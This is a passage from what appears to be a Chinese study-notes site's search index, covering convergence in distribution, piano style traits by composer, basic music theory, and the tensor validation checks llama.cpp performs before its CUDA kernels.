\\xrightarrow{D} X\\) \u6216 \\(F_n \\xrightarrow{D} F\\)\u3002</p>"},{"location":"math/prob_theory/chapter4/#_8","title":"\u5224\u522b\u6cd5\u5219","text":"<p>Levy \u8fde\u7eed\u6027\u5b9a\u7406\uff1a\u8bbe \\(X_n, n \\geq 1\\) \u662f\u4e00\u5217\u968f\u673a\u53d8\u91cf\uff0c\u5177\u6709\u76f8\u5e94\u7279\u5f81\u51fd\u6570 \\(\\varphi_n(t)\\)\uff0c\\(X\\) \u662f\u53e6\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u7279\u5f81\u51fd\u6570\u4e3a \\(\\varphi(t)\\)\uff0c\u5219</p> \\[ X_n \\xrightarrow{D} X \\Leftrightarrow \\varphi_n(t) \\rightarrow \\varphi(t), \\quad t \\in \\mathbb{R}, n \\rightarrow \\infty \\] <p>Levy \u8fde\u7eed\u6027\u5b9a\u7406\u7684\u53e6\u4e00\u79cd\u5f62\u5f0f</p> <p>\u82e5 \\(X_n, n \\geq 1\\) \u662f\u4e00\u5217\u968f\u673a\u53d8\u91cf\uff0c\u5177\u6709\u76f8\u5e94\u5bc6\u5ea6\u51fd\u6570 \\(\\varphi_n(t)\\)\uff0c\u82e5</p> \\[ \\varphi_n(t) \\rightarrow \\varphi(t), \\quad t \\in \\mathbb{R}, n \\rightarrow \\infty \\] <p>\u4e14 \\(\\varphi(t)\\) \u5728 \\(0\\) \u5904\u8fde\u7eed\uff0c\u5219 \\(\\varphi(t)\\) \u4e00\u5b9a\u662f\u7279\u5f81\u51fd\u6570\uff0c\u5bf9\u5e94\u7684\u968f\u673a\u53d8\u91cf \\(X\\) \u6ee1\u8db3</p> \\[ X_n \\xrightarrow{D} X, \\quad n \\rightarrow \\infty \\]"},{"location":"math/prob_theory/chapter4/#_9","title":"\u57fa\u672c\u6027\u8d28","text":"<ol> <li> <p>\u4f9d\u6982\u7387\u6536\u655b\u610f\u5473\u7740\u4f9d\u5206\u5e03\u6536\u655b</p> <p>\u82e5 \\(X_n \\xrightarrow{P} X\\)\uff0c\u5219 \\(X_n \\xrightarrow{D} X\\)\u3002</p> </li> <li> <p>\u4f9d\u5206\u5e03\u6536\u655b\u4e0d\u610f\u5473\u7740\u4f9d\u6982\u7387\u6536\u655b</p> <p>\u7279\u6b8a\u60c5\u51b5</p> \\[ X_n \\xrightarrow{D} c \\Rightarrow X_n \\xrightarrow{P} c \\] </li> <li> <p>\u8fd0\u7b97\u6027\u8d28</p> <ol> <li> <p>\u7ebf\u6027\u8fd0\u7b97</p> <ul> <li>\u8bbe \\(X_n \\xrightarrow{D} X\\)\uff0c\\(b_n \\rightarrow b\\)\uff0c\u5219 \\(X_n + b_n \\xrightarrow{D} X + b\\)</li> <li>\u8bbe \\(X_n \\xrightarrow{D} X\\)\uff0c\\(a_n \\rightarrow a\\)\uff0c\u5219 \\(a_nX_n \\xrightarrow{D} aX\\)</li> </ul> </li> <li> <p>\u8bbe \\(X_n \\xrightarrow{D} X\\)\uff0c\\(Y_n \\xrightarrow{D} c\\)\uff0c\u5219 \\(X_nY_n \\xrightarrow{D} cX\\)</p> </li> <li>\u82e5 \\(g\\) \u8fde\u7eed\uff0c\u5219 \\(g(X_n) \\xrightarrow{D} g(X)\\)</li> </ol> </li> </ol>"},{"location":"others/","title":"\u5176\u4ed6\u8bfe\u7a0b","text":"<ul> <li>\u89c6\u5531\u7ec3\u8033</li> <li>\u6253\u5f00\u827a\u672f\u4e4b\u95e8\u2014\u2014\u94a2\u7434</li> </ul>"},{"location":"others/piano/","title":"\u6253\u5f00\u827a\u672f\u4e4b\u95e8\u2014\u2014\u94a2\u7434","text":""},{"location":"others/piano/#_2","title":"\u770b\u8c31\u8bc6\u66f2","text":"<p>\u8981\u70b9</p> <ul> <li>\u4e50\u8c31\u521d\u59cb\u6807\u8bb0\uff1a\u901f\u5ea6\u3001\u62cd\u53f7\u3001\u8c03\u53f7\u3002</li> <li>\u4e34\u65f6\u53d8\u97f3\u8bb0\u53f7\u3002</li> <li>\u8fd0\u97f3\u6cd5\u8bb0\u53f7\uff1a\u8fde\u97f3\u3001\u98a4\u97f3\u3001\u6ed1\u97f3\u3002</li> <li>\u88c5\u9970\u97f3\u8bb0\u53f7\u3002</li> <li>\u8e0f\u677f\u6807\u8bb0\u3002</li> <li>\u7ec7\u4f53\uff1a\u4f34\u594f\u4e0e\u65cb\u5f8b\u3002</li> </ul>"},{"location":"others/piano/#_3","title":"\u83ab\u624e\u7279","text":"<ul> <li>\u7ec7\u4f53\u7cbe\u7b80\u6e05\u6670\uff0c\u4f34\u594f\u901a\u5e38\u4e3a\u963f\u5c14\u8d1d\u8482\u4f4e\u97f3\u53ca\u5176\u53d8\u4f53\uff0c\u65cb\u5f8b\u5e38\u4e3a\u7c7b\u4f3c\u97f3\u9636\u7684\u7ea7\u8fdb\u8fdb\u884c\u3002     </li> <li>\u4e34\u65f6\u53d8\u97f3\u8bb0\u53f7\u5076\u5c14\u51fa\u73b0\u3002</li> <li>\u591a\u8fde\u97f3\u7ebf\uff0c\u77ed\u8df3\u97f3\u3002     </li> <li>\u88c5\u9970\u97f3\u8f83\u5e38\u89c1\uff0c\u5305\u62ec trill\uff08\u98a4\u97f3\uff09\u3001\u501a\u97f3\u3001\u77ed\u7436\u97f3\u7b49\u3002     </li> <li>\u901a\u5e38\u6ca1\u6709\u8e0f\u677f\u6807\u8bb0\u3002</li> </ul>"},{"location":"others/piano/#_4","title":"\u8d1d\u591a\u82ac","text":"<ul> <li>\u7ec7\u4f53\u4e30\u5bcc\uff0c\u4f34\u594f\u4e30\u5bcc\uff0c\u963f\u5c14\u8d1d\u8482\u4f4e\u97f3\u5c11\u89c1\uff0c\u8fde\u7eed\u53cc\u97f3\u548c\u5f26\u3001\u516b\u5ea6\u3001\u516b\u5ea6\u7436\u97f3\u8f83\u591a\uff0c\u65cb\u5f8b\u4e2d\u7436\u97f3\u8fdb\u884c\u5e38\u89c1\u3002      </li> <li>\u4e34\u65f6\u53d8\u97f3\u8bb0\u53f7\u51fa\u73b0\u8f83\u83ab\u624e\u7279\u591a\u3002</li> <li>\u8fd0\u97f3\u6cd5\u8bb0\u53f7\u4e30\u5bcc\uff0c\u77ed\u8df3\u97f3\u8f83\u5c11\uff0c\u5e38\u4e3a\u8fde\u97f3\u7ebf\u3001\u8df3\u97f3\u3002</li> <li>\u5f3a\u5f31\u53d8\u5316\u4e30\u5bcc\uff0c\u7a81\u5f3a\uff08sf\uff09\u5e38\u51fa\u73b0\u4e14\u653e\u7f6e\u5728\u5f31\u62cd\u3002     </li> <li>\u901a\u5e38\u6ca1\u6709\u8e0f\u677f\u6807\u8bb0\u3002</li> </ul>"},{"location":"others/piano/#_5","title":"\u8212\u4f2f\u7279","text":"<ul> <li>\u7ec7\u4f53\u6e05\u6670\uff0c\u4e50\u8c31\u7ed3\u6784\u5de5\u6574\uff0c\u4f34\u594f\u901a\u5e38\u4e3a\u5206\u89e3\u548c\u5f26\uff0c\u8282\u594f \u91cd\u590d\u6027\u9ad8\uff0c\u5e38\u7ef4\u6301\u591a\u4e2a\u5c0f\u8282\u3002     </li> <li>\u65cb\u5f8b\u5e38\u51fa\u73b0\u5728\u53f3\u624b\uff0c\u5177\u6709\u6b4c\u5531\u6027\uff0c\u8fde\u97f3\u7ebf\u8f83\u5e38\u89c1\u3002</li> </ul>"},{"location":"others/piano/#_6","title":"\u8096\u90a6","text":"<ul> <li>\u7ec7\u4f53\u6e05\u6670\uff0c\u53e5\u5f0f\u7ed3\u6784\u4f20\u7edf\uff0c\u4f34\u594f\u5e38\u4e3a\u5206\u89e3\u548c\u5f26\u3001\u7436\u97f3\uff0c\u97f3\u7a0b\u8de8\u5ea6\u5927\uff0c\u4f34\u594f\u58f0\u90e8\u5e38\u9690\u85cf\u5185\u58f0\u90e8\u3002     </li> <li>\u65cb\u5f8b\u5e38\u89c1\u53f3\u624b\uff0c\u65cb\u5f8b\u7ebf\u6761\u5177\u6709\u6b4c\u5531\u6027\uff0c\u88c5\u9970\u97f3\u8f83\u4e3a\u5e38\u89c1\u3002</li> <li>\u534a\u97f3\u4f7f\u7528\u8f83\u591a\uff08\u91cd\u5347\u3001\u91cd\u964d\u8bb0\u53f7 \u4f7f\u7528\u9891\u7e41\uff09\u3002     </li> </ul>"},{"location":"others/piano/#_7","title":"\u674e\u65af\u7279","text":"<ul> <li>\u901a\u5e38\u5305\u542b\u6709\u89c4\u5f8b\u7684\u6280\u5de7\u6027\u7247\u6bb5\uff08\u5982\u91cd\u590d\u7436\u97f3\u7b49\uff09</li> <li>\u6280\u5de7\u79cd\u7c7b\u4e30\u5bcc\uff0c\u901f\u5ea6\u6781\u5feb\u3002     </li> <li>\u65cb\u5f8b\u5e38\u4f7f\u7528\u53cc\u97f3\u51fa\u73b0\uff0c\u516b\u5ea6\u8fdb\u884c\u5e38\u89c1\u3002</li> <li>\u5e38\u6709\u9707\u97f3\u7b49\u6280\u5de7\u3002</li> <li>\u60c5\u611f\u4e30\u5bcc\uff0c\u5bf9\u6bd4\u5f3a\u70c8\u3002</li> </ul>"},{"location":"others/piano/#_8","title":"\u5fb7\u5f6a\u897f","text":"<ul> <li>\u7ec7\u4f53\u590d\u6742\uff0c\u540c\u97f3\u5e38\u88ab\u5206\u914d\u5230\u4e0d\u540c\u58f0\u90e8\u3002</li> <li>\u5e38\u4f7f\u7528\u4e09\u884c\u8c31\u8868\u3002</li> <li>\u5e38\u4f7f\u7528 pp\u3002</li> <li>\u53d8\u5316\u97f3\u591a\uff0c\u5347\u964d\u8bb0\u53f7\u591a\uff0c\u548c\u58f0\u4e30\u5bcc\u3002</li> <li>\u5e38\u89c1\u6807\u8bb0 Cedez \u6216 rit. \u3001au mouvt \u7b49\u3002     </li> </ul>"},{"location":"others/piano/#_9","title":"\u62c9\u5a01\u5c14","text":"<ul> <li>\u7ec7\u4f53\u4e0e\u5fb7\u5f6a\u897f\u76f8\u4f3c\uff0c\u6280\u5de7\u66f4\u590d\u6742\u3002</li> <li>\u53cd\u5dee\u66f4\u660e\u663e\uff0cpp \u548c ff \u7684\u5bf9\u6bd4\u5f3a\u70c8\u3002</li> <li>\u65cb\u5f8b\u5e38\u88ab\u5b8c\u6574\u91cd\u590d\u3002      </li> </ul>"},{"location":"others/piano/#_10","title":"\u62c9\u8d6b\u739b\u5c3c\u8bfa\u592b","text":"<ul> <li>\u7ec7\u4f53\u4e30\u5bcc\uff0c\u65cb\u5f8b\u901a\u5e38\u5728\u516b\u5ea6\u57fa\u7840\u4e0a\u52a0\u5165\u548c\u58f0\u5185\u58f0\u90e8\u3002</li> <li>\u67f1\u5f0f\u548c\u5f26\u5e38\u89c1\u3002     </li> <li>\u5f3a\u5f31\u53d8\u5316\u4e30\u5bcc\uff0c\u51fa\u73b0 sffff \u7b49\u6807\u8bb0\u3002     </li> <li>\u4f34\u594f\u5e38\u4f7f\u7528\u5305\u542b\u5341\u516d\u5206\u97f3\u7b26\u7684\u5927\u8de8\u5ea6\u7436\u97f3\u3002     </li> <li>\u6280\u5de7\u8270\u6df1\u590d\u6742\u3002</li> </ul>"},{"location":"others/sight_singing/","title":"\u89c6\u5531\u7ec3\u8033","text":""},{"location":"others/sight_singing/#_2","title":"\u4e94\u5ea6\u5708","text":"<p>\u4e94\u5ea6\u5708\u89c4\u5f8b\uff1a</p> \u4f4d\u7f6e 10 \u70b9 11 \u70b9 12 \u70b9 1 \u70b9 2 \u70b9 \u5927\u8c03\u4e3b\u97f3 \u964d B F C G D \u5c0f\u8c03\u4e3b\u97f3 G D A E B \u8c03\u53f7\u4e2a\u6570 2 \u964d\u53f7 1 \u964d\u53f7 0 1 \u5347\u53f7 2 \u5347\u53f7 <ul> <li>\u6839\u636e\u4e3b\u97f3\u5224\u65ad\u5927\u8c03\u8fd8\u662f\u5c0f\u8c03\u3002</li> <li>\u5982\u679c\u662f\u5c0f\u8c03\uff1a<ul> <li>\u5982\u679c\u6ca1\u6709\u5347\u53f7\uff0c\u662f\u81ea\u7136\u5c0f\u8c03\u3002     </li> <li>\u5982\u679c\u4e00\u4e2a\u5347\u53f7\u5728\u4e03\u7ea7\u97f3\uff0c\u662f\u548c\u58f0\u5c0f\u8c03\u3002     </li> <li>\u5982\u679c\u4e24\u4e2a\u5347\u53f7\u5206\u522b\u5728\u516d\u4e03\u7ea7\u97f3\uff0c\u662f\u65cb\u5f8b\u5c0f\u8c03\u3002     </li> </ul> </li> </ul> <p>\u79fb\u8c03\uff1a</p> <ol> <li>\u66ff\u6362\u8c03\u53f7\u3002</li> <li>\u627e\u5230\u4e3b\u97f3\u97f3\u7a0b\u5dee\u8ddd\u3002</li> <li>\u6240\u6709\u97f3\u7a0b\u90fd\u6309\u7167\u5dee\u8ddd\u79fb\u52a8\u3002</li> </ol>"},{"location":"others/sight_singing/#_3","title":"\u97f3\u7a0b\u8ba1\u7b97","text":"<ul> <li>\u51cf&lt;\u5c0f&lt;\u5927&lt;\u589e\uff1a\u4e8c\u5ea6\u3001\u4e09\u5ea6\u3001\u516d\u5ea6\u3001\u4e03\u5ea6\u3002</li> <li>\u51cf&lt;\u7eaf&lt;\u589e\uff1a\u56db\u5ea6\u3001\u4e94\u5ea6\u3002</li> </ul> <p>\u8f6c\u4f4d\uff1a</p> <ul> <li>\u51cf\u97f3\u7a0b\u7684\u8f6c\u4f4d\u662f\u589e\u97f3\u7a0b\uff0c\u5c0f\u97f3\u7a0b\u7684\u8f6c\u4f4d\u662f\u5927\u97f3\u7a0b\uff0c\u7eaf\u97f3\u7a0b\u7684\u8f6c\u4f4d\u662f\u7eaf\u97f3\u7a0b\u3002</li> <li>\u4e8c\u5ea6\u7684\u8f6c\u4f4d\u662f\u4e03\u5ea6\uff0c\u4e09\u5ea6\u7684\u8f6c\u4f4d\u662f\u516d\u5ea6\uff0c\u56db\u5ea6\u7684\u8f6c\u4f4d\u662f\u4e94\u5ea6\u3002</li> </ul> <p>\u4e09\u5168\u97f3\uff1a\u589e\u56db\u5ea6\u3001\u51cf\u4e94\u5ea6\u3002\uff08<code>F-B</code>\uff09</p> <p>\u5224\u65ad\u97f3\u7a0b\uff1a</p> <ol> <li>\u5ffd\u7565\u5347\u964d\u53f7\uff0c\u5224\u65ad\u662f\u51e0\u5ea6\u3002</li> <li>\u6839\u636e\u5347\u964d\u53f7\u5224\u65ad\u662f\u51cf\u3001\u5c0f\u3001\u5927\u3001\u589e\u3002</li> <li>\u6709\u65f6\u5019\u53ef\u4ee5\u8f6c\u4f4d\u4e4b\u540e\u5224\u65ad\u3002</li> </ol> <p>\u4f8b\u5b50</p> <p></p> \u7b54\u6848 <p></p>"},{"location":"others/sight_singing/#_4","title":"\u4e09\u548c\u5f26","text":"<p>\u7531\u4e09\u4e2a\u4e0d\u540c\u97f3\u9ad8\u53e0\u52a0\u800c\u6210\uff0c\u76f8\u90bb\u4e09\u4e2a\u97f3\u5206\u522b \u6784\u6210\u4e09\u5ea6 \u3002</p>"},{"location":"others/sight_singing/#_5","title":"\u4e09\u548c\u5f26\u7684\u5206\u7c7b","text":"<ul> <li>\u5927\u4e09\u548c\u5f26\uff1a\u5927\u4e09\u5ea6 + \u5c0f\u4e09\u5ea6\u3002</li> <li>\u5c0f\u4e09\u548c\u5f26\uff1a\u5c0f\u4e09\u5ea6 + \u5927\u4e09\u5ea6\u3002</li> <li>\u51cf\u4e09\u548c\u5f26\uff1a\u5c0f\u4e09\u5ea6 + \u5c0f\u4e09\u5ea6\u3002</li> </ul> <p>\u4e09\u548c\u5f26\u8868\u793a\u6cd5\uff1a</p> <p>\u4e00\u3001\u56db\u3001\u4e94\u7ea7\u4e09\u548c\u5f26\u4e3a\u5927\u4e09\u548c\u5f26\uff0c\u4e8c\u3001\u4e09\u3001\u516d\u7ea7\u4e09\u548c\u5f26\u4e3a\u5c0f\u4e09\u548c\u5f26\u3001\u4e03\u7ea7\u4e09\u548c\u5f26\u4e3a\u51cf\u4e09\u548c\u5f26\u3002</p> <ul> <li>\u53e4\u5178\u8868\u793a\u6cd5\uff1a\u5927\u5199\u7f57\u9a6c\u6570\u5b57\u8868\u793a\u5927\u4e09\u548c\u5f26\uff0c\u5c0f\u5199\u7f57\u9a6c\u6570\u5b57\u8868\u793a\u5c0f\u4e09\u548c\u5f26\uff0c\\(\\text{vii}^{\\circ}\\) \u8868\u793a\u51cf\u4e09\u548c\u5f26\u3002</li> <li>\u6d41\u884c\u8868\u793a\u6cd5\uff1a\u7528\u6839\u97f3\u7684\u97f3\u540d\u8868\u793a\uff0c<code>C</code> \u8868\u793a\u5927\u4e09\u548c\u5f26\uff0c<code>Dm</code> \u8868\u793a\u5c0f\u4e09\u548c\u5f26\uff0c<code>Bdim</code> \u8868\u793a\u51cf\u4e09\u548c\u5f26\u3002</li> </ul>"},{"location":"others/sight_singing/#_6","title":"\u4e09\u548c\u5f26\u7684\u8f6c\u4f4d","text":"<ul> <li>\u7b2c\u4e00\u8f6c\u4f4d\uff1a\u5c06\u6839\u97f3\u5411\u4e0a\u8f6c\u4f4d\u4e00\u4e2a\u516b\u5ea6\uff0c\u6b64\u65f6\u6700\u5927\u97f3\u7a0b\u4e3a\u516d\u5ea6\u3002</li> <li>\u7b2c\u4e8c\u8f6c\u4f4d\uff1a\u5c06\u6839\u97f3\u5411\u4e0a\u8f6c\u4f4d\u4e00\u4e2a\u516b\u5ea6\uff0c\u4e09\u97f3\u5411\u4e0a\u8f6c\u4f4d\u4e00\u4e2a\u516b\u5ea6\uff0c\u6b64\u65f6\u6700\u5927\u97f3\u7a0b\u4e3a\u516d\u5ea6\uff0c\u6b21\u5927\u97f3\u7a0b\u4e3a\u56db\u5ea6\u3002</li> </ul> <p>\u8868\u793a\u6cd5\uff1a</p> <ul> <li>\u53e4\u5178\u8868\u793a\u6cd5\uff1a\u6839\u636e\u6839\u97f3\u5224\u65ad\u51e0\u7ea7\u97f3\uff0c\u7b2c\u4e00\u8f6c\u4f4d\u5728\u53f3\u4e0a\u89d2\u6807 <code>6</code>\uff0c\u7b2c\u4e8c\u8f6c\u4f4d\u518d\u5728\u53f3\u4e0b\u89d2\u52a0 <code>4</code>\u3002</li> <li>\u6d41\u884c\u8868\u793a\u6cd5\uff1a\u6839\u636e\u6839\u97f3\u5199\u51fa\u97f3\u540d\uff0c\u8f6c\u4f4d\u5728\u540e\u9762\u52a0 <code>/</code> \u548c\u6700\u4f4e\u97f3\u97f3\u540d\u3002</li> </ul> <p>\u4f8b\u5b50</p> <p></p> <p>\u53e4\u5178\u8868\u793a\u6cd5\u5206\u522b\u4e3a\uff1a\\(\\text{ii}, \\text{iii}^6, \\text{V}, \\text{i}\\)\u3002</p> <p>\u4e03\u548c\u5f26</p> <p></p> <p>\u540c\u65f6\u5305\u542b\u4e24\u4e2a\u4e09\u548c\u5f26\u3002</p> <p>\u5c5e\u4e03\u548c\u5f26\uff08\u5927\u5c0f\u4e03\u548c\u5f26\uff09\uff1a\u7531\u6839\u97f3\u4e0a\u65b9\u5927\u4e09\u548c\u5f26+\u6839\u97f3\u4e0a\u65b9\u5c0f\u4e03\u5ea6\u6784\u6210\u3002</p> <p></p>"},{"location":"others/sight_singing/#_7","title":"\u56db\u90e8\u548c\u58f0","text":"<ul> <li>\u7b80\u5316\uff1a\u4ece\u4f4e\u5230\u9ad8\u627e\u5230\u6240\u6709\u4e0d\u91cd\u590d\u7684\u97f3\u3002</li> <li>\u5224\u65ad\uff1a\u6839\u636e\u6839\u97f3\u548c\u6700\u4f4e\u97f3\u5224\u65ad\u548c\u5f26\u3002</li> </ul> <p>\u4f8b\u5b50</p> <p></p>"},{"location":"research/llama_5.28/","title":"Llama CUDA Check Rules","text":"<p>llama.cpp \u540e\u7aef\u5728\u8c03\u7528 CUDA kernel \u8ba1\u7b97\u4e4b\u524d\u4f1a\u5bf9 tensor \u8fdb\u884c\u68c0\u67e5\u3002</p>"},{"location":"research/llama_5.28/#check-rules","title":"Check Rules","text":"<ul> <li>\u6570\u636e\u7c7b\u578b\u4e00\u81f4\u6027\uff1a<ul> <li>\u68c0\u6d4b <code>src0</code>\u3001<code>src1</code> \u548c <code>dst</code> \u7684\u6570\u636e\u7c7b\u578b\u662f\u5426\u80fd\u88ab\u5f53\u524d\u64cd\u4f5c\u652f\u6301\u3002</li> <li>\u68c0\u67e5\u67d0\u4e24\u4e2a\u5f20\u91cf\u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c\u3002</li> </ul> </li> <li>\u5185\u5b58\u5e03\u5c40\uff1a<ul> <li>\u68c0\u67e5\u5f20\u91cf\u7684\u5185\u5b58\u5e03\u5c40\u662f\u5426\u8fde\u7eed\uff08<code>ggml_is_contiguous</code>\uff09\u3002</li> <li>\u68c0\u67e5\u6700\u5185\u5c42\u7ef4\u5ea6\u7684\u5143\u7d20\u662f\u5426\u8fde\u7eed\uff0c\u5373\u5b57\u8282\u6b65\u957f\u662f\u5426\u7b49\u4e8e\u6570\u636e\u7c7b\u578b\u7684\u5927\u5c0f\u3002\uff08\u786e\u4fdd\u80fd\u88ab GPU \u9ad8\u6548\u8bbf\u95ee\uff09</li> </ul> </li> <li>\u5f20\u91cf\u5f62\u72b6\u3001\u5927\u5c0f\u68c0\u67e5\uff1a<ul> <li>\u6709\u4e9b\u64cd\u4f5c\u5bf9\u5f20\u91cf\u7684\u5f62\u72b6\u6709\u9650\u5236\uff0c\u53ef\u80fd\u9650\u5236\u4e3a\u4e8c\u7ef4\u6216\u4e09\u7ef4\u5f20\u91cf\uff0c\u6216\u8005\u9650\u5236\u67d0\u4e9b\u7ef4\u5ea6\u7684\u5947\u5076\u6027\u3002</li> <li>\u68c0\u67e5\u5f20\u91cf\u4e4b\u95f4\u7684\u5f62\u72b6\u662f\u5426\u5339\u914d\uff0c\u6bd4\u5982\u5e7f\u64ad\u64cd\u4f5c</li> <li>\u68c0\u67e5\u5f20\u91cf\u603b\u5143\u7d20\u4e2a\u6570\u662f\u5426\u5339\u914d\uff0c\u6bd4\u5982\u751f\u6210\u7b49\u5dee\u6570\u5217\u5fc5\u987b\u5f20\u91cf\u5143\u7d20\u4e2a\u6570\u548c\u7b49\u5dee\u6570\u5217\u957f\u5ea6\u76f8\u540c\u3002</li> <li>\u68c0\u67e5\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u6d89\u53ca\u7684\u5f20\u91cf\u5143\u7d20\u4e2a\u6570\u662f\u5426\u5728\u67d0\u4e9b\u8303\u56f4\u5185\uff0c\u6bd4\u5982 <code>ggml_cuda_count_equal</code> \u4e2d\u7684\u5143\u7d20\u4e2a\u6570\u9650\u5236\u5728 int32 \u8303\u56f4\u5185\u3002</li> </ul> </li> <li>\u53c2\u6570\u6709\u6548\u6027\uff1a<ul> <li>\u4ece <code>ggml_tensor</code> \u7684 <code>op_params</code> \u4e2d\u83b7\u53d6\u53c2\u6570\uff0c\u68c0\u67e5\u53c2\u6570\u662f\u5426\u5728\u5408\u7406\u8303\u56f4\u5185\u3002</li> </ul> </li> <li>\u540e\u7aef\u68c0\u67e5\uff1a<ul> <li>\u90e8\u5206\u64cd\u4f5c\u9700\u8981\u9650\u5236 tensor \u7684\u540e\u7aef\u4e3a CUDA\u3002</li> </ul> </li> </ul>"},{"location":"research/llama_5.28/#_1","title":"\u68c0\u67e5\u89c4\u5219","text":""},{"location":"research/llama_5.28/#ggml_cuda_argmax","title":"ggml_cuda_argmax","text":"<p>\u627e\u6bcf\u4e00\u884c\u7684\u6700\u5927\u503c\u5217\u7d22\u5f15\u3002</p> <ul> <li>\u68c0\u67e5 <code>src</code> \u548c <code>dst</code> \u7c7b\u578b</li> <li>\u68c0\u67e5 <code>src</code> \u8fde\u7eed\u6027\uff08<code>ggml_is_contiguous</code>\uff09</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_count_equal","title":"ggml_cuda_count_equal","text":"<p>\u8ba1\u7b97 <code>src0</code> \u548c <code>src1</code> \u4e2d\u5bf9\u5e94\u4f4d\u7f6e\u7684\u5143\u7d20\u76f8\u7b49\u7684\u4e2a\u6570\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>src1</code> \u7c7b\u578b\u662f\u5426\u76f8\u540c</li> <li><code>dst</code> \u5fc5\u987b\u662f I64 \u7c7b\u578b</li> <li><code>src0</code> \u548c <code>src1</code> \u5f62\u72b6\u5fc5\u987b\u76f8\u540c</li> <li>\u68c0\u67e5 <code>src0</code>\u3001<code>src1</code> \u548c <code>dst</code> \u8fde\u7eed\u6027</li> <li>\u9650\u5236 <code>src0</code> \u548c <code>src1</code> \u7684\u5143\u7d20\u603b\u6570\u5728 int32 \u8303\u56f4\u5185\uff08cuda <code>atomicAdd</code> \u53ea\u80fd\u5904\u7406 int32\uff09</li> <li>\u4e3a <code>dst</code> \u5bf9\u5e94\u5185\u5b58\u6e05\u96f6\uff0c\u5e76\u4e14\u68c0\u67e5\u662f\u5426\u6210\u529f</li> <li>\u5f53 <code>src0</code> \u548c <code>src1</code> \u7c7b\u578b\u4e3a I32 \u65f6\u624d\u8fdb\u884c\u8ba1\u7b97</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_repeat_back","title":"ggml_cuda_op_repeat_back","text":"<p>\u5bf9 repeat \u64cd\u4f5c\u7684\u53cd\u5411\u4f20\u64ad\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c</li> <li>\u68c0\u67e5 <code>dst</code> \u8fde\u7eed\u6027</li> <li>\u68c0\u67e5 <code>src0</code> \u662f\u5426\u80fd\u7531 <code>dst</code> \u901a\u8fc7 repeat \u64cd\u4f5c\u5f97\u5230</li> <li><code>GGML_ASSERT(ne2*ne3 &lt;= (1 &lt;&lt; 15));</code>\uff1a\u68c0\u67e5 <code>dst</code> \u7684\u7b2c\u4e09\u548c\u7b2c\u56db\u7ef4\u5ea6\uff08<code>ne2</code> \u548c <code>ne3</code>\uff09\u7684\u4e58\u79ef\u662f\u5426\u5728 int16 \u8303\u56f4\u5185\uff08\u53ef\u80fd\u548c cuda kernel \u7f51\u683c\u5927\u5c0f\u548c\u5757\u5927\u5c0f\u6709\u5173\uff1f\uff09</li> <li><code>dst</code> \u7c7b\u578b\u5fc5\u987b\u4e3a F32</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_get_rows","title":"ggml_cuda_op_get_rows","text":"<p>\u4ece <code>src0</code> \u4e2d\u83b7\u53d6 <code>src1</code> \u6307\u5b9a\u7684\u884c\u5411\u91cf\uff0c\u7ec4\u6210\u65b0\u7684\u5f20\u91cf\u5b58\u5230 <code>dst</code> \u4e2d\u3002</p> <ul> <li>\u68c0\u67e5 <code>src1</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a I32</li> <li>\u68c0\u67e5 <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u4e3a F32</li> <li>\u5206\u522b\u68c0\u67e5 <code>src0</code>\u3001<code>src1</code> \u548c <code>dst</code> \u7ef4\u5ea6 0 \u4e2d\u7684\u5143\u7d20\u5728\u5185\u5b58\u4e2d\u662f\u5426\u8fde\u7eed</li> <li>\u5bf9 <code>src0</code> \u7684\u7c7b\u578b\u5206\u7c7b<ul> <li>F32\u3001F16\uff1a\u8fdb\u4e00\u6b65\u68c0\u67e5 <code>src1</code> \u7684\u7b2c\u56db\u4e2a\u7ef4\u5ea6\u4e3a 1</li> <li>\u91cf\u5316\u7c7b\u578b Q4_0\u3001Q8_0 \u7b49\uff1a\u68c0\u67e5 <code>src0</code> \u6700\u5185\u5c42\u7ef4\u5ea6\u662f\u5076\u6570\uff0c\u5e94\u8be5\u662f\u548c\u91cf\u5316\u7684\u5206\u5757\u673a\u5236\u6709\u5173</li> </ul> </li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_op_get_rows_back","title":"ggml_cuda_op_get_rows_back","text":"<p>\u5bf9 <code>ggml_cuda_op_get_rows</code> \u7684\u53cd\u5411\u4f20\u64ad\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code>\u3001<code>src1</code> \u548c <code>dst</code> \u7684\u7c7b\u578b\u662f\u5426\u5206\u522b\u4e3a F32\u3001I32 \u548c F32</li> <li>\u68c0\u67e5\u4e09\u4e2a\u5f20\u91cf\u7684\u8fde\u7eed\u6027</li> <li>\u68c0\u67e5\u4e09\u4e2a\u5f20\u91cf\u7684\u7b2c\u4e09\u56db\u7ef4\u5ea6\uff08<code>ne2</code> \u548c <code>ne3</code>\uff09\u7684\u4e58\u79ef\u662f\u5426\u4e3a 1\uff0c\u5373\u4e09\u4e2a\u5f20\u91cf\u90fd\u4e3a\u4e8c\u7ef4\u5f20\u91cf</li> </ul>"},{"location":"research/llama_5.28/#ggml_cuda_dup","title":"ggml_cuda_dup","text":"<p>\u5c06 <code>src</code> \u7684\u6570\u636e\u590d\u5236\u5230 <code>dst</code>\u3002\u76f4\u63a5\u8c03\u7528 <code>ggml_cuda_cpy</code>\u3002</p>"},{"location":"research/llama_5.28/#ggml_cuda_cpy","title":"ggml_cuda_cpy","text":"<p>\u5c06 <code>src0</code> \u7684\u6570\u636e\u590d\u5236\u5230 <code>src1</code>\u3002</p> <ul> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>src1</code> \u5143\u7d20\u4e2a\u6570\u662f\u5426\u76f8\u540c</li> <li>\u68c0\u67e5 <code>src0</code> \u548c <code>src1</code> \u5360\u7528\u5b57\u8282\u6570\u662f\u5426\u5728 int32 \u8303\u56f4\u5185</li> </ul> <p>\u8ba1\u7b97\u90e8\u5206\uff1a</p> <ul> <li>\u5982\u679c <code>src0</code> \u548c <code>src1</code> 